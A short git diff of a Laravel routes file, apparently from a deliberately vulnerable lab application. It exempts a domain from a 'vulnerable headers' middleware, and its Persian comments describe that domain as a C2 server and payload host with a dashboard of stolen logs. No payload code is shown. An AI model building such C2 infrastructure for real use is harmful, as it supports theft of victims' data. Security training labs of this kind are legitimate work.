@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Middleware\VulnerableHeadersMiddleware;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\VulnerabilityController;
@@ -11,7 +12,8 @@ use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken;
 |--------------------------------------------------------------------------
 | این بخش به عنوان سرور C2 (Command and Control) و میزبان پی‌لودها عمل می‌کند.
 */
-Route::domain('hackerapp.eitebar.ir')->group(function () {
+Route::domain('hackerapp.eitebar.ir')->withoutMiddleware([VulnerableHeadersMiddleware::class])
+    ->group(function () {
 
     // داشبورد اصلی هکر (لاگ‌های سرقت شده)
     Route::get('/', [VulnerabilityController::class, 'viewLogs'])->name('hacker.home');
